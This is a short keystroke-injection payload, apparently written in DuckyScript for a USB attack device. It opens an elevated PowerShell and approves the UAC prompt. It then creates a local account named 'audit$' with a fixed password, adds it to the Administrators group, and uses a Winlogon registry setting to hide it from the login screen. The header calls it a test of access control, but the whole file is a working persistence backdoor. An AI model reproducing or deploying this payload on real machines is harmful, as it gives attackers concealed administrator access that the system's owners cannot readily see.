REM ============================================================
REM  Windows · Create Hidden Admin User
REM ============================================================
REM  Opens an elevated prompt and creates a new local admin
REM  account with a $ suffix (hidden from login screen on
REM  some Windows editions). Tests access control policies.
REM
REM  Requires UAC bypass or user clicking Yes.

DEFAULTDELAY 60

DEFINE UNAME audit$
DEFINE UPASS Str0ng!Pass2024

GUI r
DELAY 700
STRING powershell
CTRL SHIFT ENTER
DELAY 2000
ALT y
DELAY 1500
STRINGLN net user UNAME UPASS /add /y
STRINGLN net localgroup Administrators UNAME /add
STRINGLN reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v UNAME /t REG_DWORD /d 0 /f
STRINGLN exit
